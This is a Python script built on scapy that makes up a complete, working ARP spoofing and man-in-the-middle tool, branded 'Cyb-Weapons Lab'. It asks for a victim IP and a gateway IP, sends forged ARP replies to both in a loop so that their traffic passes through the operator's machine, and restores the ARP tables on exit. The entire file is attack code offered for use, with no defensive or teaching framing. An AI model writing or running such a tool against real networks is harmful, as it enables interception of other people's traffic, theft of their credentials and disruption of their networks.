import scapy.all as scapy
import time
import sys

def show_banner():
    # 'Filled' style ASCII art for a professional look
    print(r'''
 █████╗ ██████╗ ██████╗     ███████╗██████╗  ██████╗  ██████╗███████╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗ ██╔══██╗██╔════╝██╔════╝██╔══██╗
███████║██████╔╝██████╔╝    ███████╗██████╔╝██║  ██║ ██║  ██║█████╗  █████╗  ██████╔╝
██╔══██║██╔══██╗██╔══       ╚════██║██╔═══╝ ██║  ██║ ██║  ██║██╔══╝  ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║         ███████║██║     ╚██████╔╝██████╔╝██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝
                                                               
     [ Cyb-Weapons Lab | ARP Spoofer & MitM Tool ]
     [ Created by White20devilera ]
    =========================================================================
    ''')

def get_mac(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        
        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
        
        if not answered_list:
            return None
            
        return answered_list[0][1].hwsrc
    except Exception:
        return None

def spoof(target_ip, spoof_ip):
    '''Sends a fake arp packet to target'''
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"\r[!] Could not find MAC for {target_ip}. Skipping...", end="")
        return False
    
    # op=2 is an ARP reply
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
    return True

def restore(destination_ip, source_ip):
    """ Restoring the network """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, 
                          psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)


# --- Program Startup ---
show_banner()

target_ip = input("Enter Victim IP: ").strip()
gateway_ip = input("Enter Router/Gateway IP: ").strip()

try:
    sent_packets_count = 0
    print("\n[*] Starting ARP Spoofing... Press Ctrl+C to stop.")
    
    while True:
        # spoofing either sides
        check1 = spoof(target_ip, gateway_ip)
        check2 = spoof(gateway_ip, target_ip)
        
        if check1 and check2:
            sent_packets_count += 2
            print(f"\r[+] Packets sent: {sent_packets_count}", end="")
            sys.stdout.flush() 
            
        time.sleep(2) 

except KeyboardInterrupt:
    print("\n[!] Detected Ctrl+C... Restoring network. Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] Network restored. Exiting.")

except Exception as e:
    print(f"\n[!] An unexpected error occurred: {e}")